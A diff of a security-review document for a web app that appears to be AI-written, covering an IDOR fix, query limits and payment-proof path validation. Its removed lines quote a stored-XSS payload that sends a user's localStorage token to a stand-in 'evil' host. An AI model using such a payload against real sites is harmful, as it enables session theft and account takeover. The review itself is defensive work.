@@ -1,55 +1,58 @@
 # Lawnn — Security Review & Hardening
 
-_Date: 2026-06-10 · Scope: full codebase (Express/Prisma backend, Socket.io, React/Vite frontend). Changes applied locally only — not committed or pushed._
+_Last updated: 2026-06-19 · Scope: full pre-launch review of the Express/Prisma backend, Socket.io, and React/Vite frontend, including the Jobs→Projects merge, the manual-InstaPay payment flow, private file signing, and feed comments. Changes applied locally only — not committed or pushed._
 
 ## Summary
 
-The codebase was in reasonable shape on the fundamentals: bcrypt (12 rounds), JWT verification with no insecure fallback, parameterised Prisma queries (no SQL injection surface), role checks on privileged routes, helmet, CORS allowlist, atomic escrow transactions, and consistent ownership checks (`isParticipant`, `sellerId`, `clientId`). React's default escaping means there is no `dangerouslySetInnerHTML` and no classic DOM-XSS sink.
+The codebase remains in good shape on fundamentals: bcrypt (12 rounds), JWT verification with a fail-fast on a missing/weak secret, parameterised Prisma queries (no SQL-injection surface), role checks on privileged routes, helmet, a CORS allowlist, rate limiting (global + strict auth), atomic payment-state transactions, and identity derived from the verified JWT rather than request-body claims. The frontend has **no** `dangerouslySetInnerHTML`, `innerHTML`, or `eval` sinks, and ships **no secrets** (only the public API base URL; all storage uploads go through backend-signed URLs).
 
-The most serious issue was **stored XSS via attacker-controlled URL fields**, plus a **confused-deputy endpoint** that could sign reads for arbitrary private files. Both are now fixed, along with several hardening improvements. Two items remain that only you can complete (credential rotation and a dependency scan) because they need database access / the shell.
+This pass focused on the surface added/changed since the June 10 review. The new payment, application, and comment endpoints enforce authorization correctly: the payment state machine's money steps are admin-only, payment-proof and application files in the private bucket are only signed for the admin or the owning client (a hired student never sees the client's transfer screenshots or rival applicants' files), and comments are limited to approved posts and rendered as escaped JSX text.
 
-## Findings and fixes
+One genuine access-control bug was found and fixed (profile mass-assignment), along with several hardening fixes (pagination caps, stricter proof-path validation). A short list of items remains that only you can complete (credential rotation, `npm audit`, `.env` check) plus the standing architectural recommendation to move the JWT out of `localStorage`.
 
-### HIGH — Stored XSS through unvalidated URL fields → account takeover
-Multiple models stored a URL straight from the request body and the UI later rendered it as an `<a href>`, `<img src>`, or CSS `background-image`: job attachments, application files, feed `imageUrl`, marketplace `fileUrl`, profile `avatar` / portfolio `imageUrl` / `pdfUrl`, client-profile `logo`, and chat message `fileUrl`. A value such as `javascript:fetch('//evil/?c='+localStorage.lawnn_token)` persisted on a job attachment would execute in any viewer's session when clicked. Because the JWT lives in `localStorage`, this is a full account-takeover primitive.
+## Findings and fixes (applied this pass)
 
-Fix: added `backend/src/lib/sanitize.js` with `safeUrl()`, which accepts only absolute `http(s)` URLs or scheme-less storage paths and drops anything carrying an executable scheme or a protocol-relative prefix. It is now applied at every write point listed above (`jobs.js`, `feed.js`, `marketplace.js`, `profiles.js`, `socket.js`). Defense-in-depth was also added on the frontend: the job-attachment anchor in `App.jsx` only emits an `href` when the stored value is `http(s)`.
+### MEDIUM — Mass-assignment IDOR in `PATCH /profiles/:id` (education/experience)
+The education and experience replacement blocks built rows with `education.map(e => ({ profileId: req.params.id, ...e }))`. Because the spread came **after** `profileId`, a caller editing their own profile could include `profileId: "<victim>"` in an education/experience entry and override it, writing rows into another user's profile.
 
-### HIGH/MEDIUM — Confused-deputy: `POST /uploads/sign-read`
-Any authenticated user could mint a short-lived signed read URL for **any** path in the private bucket, bypassing the per-resource authorization that `jobs.js` performs before exposing application files. The endpoint's own comment flagged the risk, and the frontend never used it.
+Fix: both blocks now pick explicit fields only (`degree`/`school`/`years`, `role`/`company`/`years`) and never spread the raw body object. (`profiles.js`)
 
-Fix: removed the public endpoint. The internal `signPrivateRead()` helper is retained and is only ever called from routes that have already verified the caller may see the file.
+### MEDIUM — Unbounded list queries (DoS / scraping)
+Several `findMany` calls had no `take` limit: the Projects board, the My-Projects list, the public talent directory, and feed comments. A large dataset (or deliberate growth) would let one request pull everything.
 
-### MEDIUM — No baseline rate limiting
-Only `/auth/login`, `/auth/register`, and `/auth/accept-invite` were limited. Object-ID enumeration, offer/notification spam, and upload-sign abuse were unbounded.
+Fix: added `take` caps — board/comments/directory `take: 200`, My-Projects `take: 200` — and capped the conversation messages page size at 100 (`Math.min(parseInt(limit)||50, 100)`). (`projects.js`, `profiles.js`, `feed.js`, `conversations.js`)
 
-Fix: added a generous global limiter (600 requests / 15 min / IP) in `index.js`, on top of the existing strict auth limiter. `trust proxy` is already set for correct client IPs behind Render/Cloudflare.
+### LOW — Payment-proof path not fully validated
+`POST /projects/:id/payment-sent` accepted any client-supplied string starting with `payment-proof/` and later signed it for the admin/owner to view.
 
-### MEDIUM — Negative / NaN numeric inputs
-`budget` and `price` were coerced with `parseInt(...) || 0`, allowing negatives (a negative project budget flows into a wallet `increment`) and NaN (which crashes the Prisma `Int` column with a 500).
+Fix: the path must now match `^payment-proof/[A-Za-z0-9_][A-Za-z0-9_\-/.]*$` and contain no `..` (no traversal, no scheme). (`projects.js`)
 
-Fix: `nonNegativeInt()` validates and floors these; invalid values now return 400. (Marketplace offer `amount` was already validated as positive.)
+## New surface — verified safe (no change needed)
 
-### LOW — Socket.io CORS treated the origin list as one literal string
-`origin: process.env.FRONTEND_URL` passed the whole comma-separated value as a single origin, so multi-origin setups would silently fail to match. Aligned it with the REST layer's parsed allowlist.
+- **Payment flow:** deposit/final confirmations (`advance`) are admin-only; `payment-sent` is restricted to the paying client; a talent cannot self-advance money steps. Wallet credit happens once, inside a transaction, only on completion. (`projects.js`)
+- **Private file signing:** application files and payment-proof screenshots are stored as private-bucket paths and only swapped for short-lived signed URLs for an admin or the owning client. A hired student never receives the client's payment screenshots, and applicants can't see each other's files. `GET /projects/:id` lets any signed-in user read an `open` project but does **not** include applications. (`projects.js`, `uploads.js`)
+- **Hiring authorization:** accepting/rejecting an applicant and moving `open → offer_accepted` is restricted to the project owner or an admin, and only while the project is `open`. (`projects.js`)
+- **Comments:** allowed only on `approved` posts, require non-empty content, and render as escaped JSX text (no HTML injection). (`feed.js`, `FeedPage.jsx`)
+- **URL writes:** every new URL/path write (application files, project attachments, portfolio refs) flows through `safeUrl()`, rejecting `javascript:`/`data:`/protocol-relative values. (`projects.js` via `cleanFiles`, `profiles.js`)
+- **Messaging & notifications:** conversation reads enforce participant/admin checks; notification read/read-all are scoped by `userId` (no IDOR). (`conversations.js`, `notifications.js`)
+- **Admin routes:** all under `requireAuth + requireRole('admin')`; invites use SHA-256-hashed tokens with a 7-day TTL; deletion guards against self-deletion and surfaces FK conflicts instead of 500s. (`admin.js`)
 
-### LOW — No fail-fast on a missing/weak `JWT_SECRET`
-The app would boot with an unset or trivially short secret. Added a startup guard that refuses to boot unless `JWT_SECRET` is at least 32 characters.
+## Lower-priority items (recommended, not yet applied)
 
-## Verified as already safe (no change needed)
-- No SQL injection: all DB access goes through Prisma with bound parameters.
-- News article bodies render as JSX text (auto-escaped), not raw HTML.
-- The client-profile website link already neutralises non-`http(s)` schemes on render.
-- Ownership/role checks are present and derive identity from the verified JWT, not request-body claims (notably `conversations.js`, which explicitly ignores client-supplied roles).
-- Passwords are never returned (`safeUser` / explicit `select`), and invite tokens are stored only as SHA-256 hashes with TTLs.
+- **Email normalization.** Emails are stored/looked up as-is (case-sensitive), which allows near-duplicate accounts (`A@x.com` vs `a@x.com`) and case-sensitive login. Normalize with `.trim().toLowerCase()` at register/login/admin-create — but do it carefully and migrate any existing mixed-case rows first, so current users can still log in.
+- **Login user-enumeration via timing.** Login returns immediately when the email doesn't exist but runs bcrypt when it does, a measurable timing oracle. Run a dummy `bcrypt.compare` on the not-found path to equalize timing.
+- **Password-length inconsistency.** `/admin/clients` requires 6 characters vs 8 for self-register and invite acceptance. Align to 8.
 
-## Action items for you (need DB access / shell — I can't do these here)
+## Action items for you (need DB access / shell / hosting config)
 
-1. **Rotate the leaked `yomna@lawnndesign.com` credential.** Per the handoff it was committed in source history and flagged by GitGuardian. Delete or rotate the account in the DB (Admin → Users), then optionally purge it from git history with `git filter-repo` + force-push. Rotation is the real fix; history-scrub is hygiene.
-2. **Run a dependency scan.** I couldn't run `npm audit` (sandbox didn't start). Run `npm audit` in both the repo root and `backend/`, and update anything flagged.
-3. **Confirm `backend/.env` is untracked.** It should be covered by the root `.gitignore` (`.env`), but verify with `git ls-files backend/.env` (expect empty output) and confirm no real secrets ever landed in history.
+1. **Rotate any leaked credential.** The prior review flagged a `yomna@lawnndesign.com` credential committed in history (GitGuardian). Rotate/delete it in the DB; optionally scrub git history.
+2. **Run `npm audit`** in both the repo root and `backend/`, and update anything flagged. (Couldn't run in-sandbox.)
+3. **Confirm `backend/.env` is untracked:** `git ls-files backend/.env` should return nothing, and verify no real secrets ever landed in history.
+4. **Set `NODE_ENV=production`** in the deployed backend — the Supabase client now refuses to boot in production if Storage env vars are missing, which only triggers when `NODE_ENV=production`.
 
-## Recommended next (architectural, not applied)
-- Consider moving the JWT from `localStorage` to an httpOnly, Secure, SameSite cookie. With the XSS sinks closed this risk is much reduced, but a cookie removes the script-readable-token primitive entirely.
-- Add a Content-Security-Policy header on the Cloudflare Pages frontend (hosting config) to further constrain script/connect sources.
-- Consider shortening the 7-day JWT lifetime and adding token revocation if you need to force logout.
+## Standing architectural recommendations
+
+- **Move the JWT from `localStorage` to an httpOnly, Secure, SameSite cookie.** With the XSS sinks closed this risk is much reduced, but a cookie removes the script-readable-token primitive entirely. (Requires backend cookie issuance + CSRF protection.)
+- **Add a Content-Security-Policy** header at the frontend host (Cloudflare Pages) to constrain script/connect sources.
+- **Shorten the 7-day JWT lifetime and/or add revocation** if you need to force logout (e.g., on role change or account deletion — currently a deleted/demoted user's token stays valid until expiry).
+- **Adopt a validation library (zod)** for request bodies. Validation is currently sound but ad-hoc; a schema layer reduces the chance a future endpoint forgets a check.
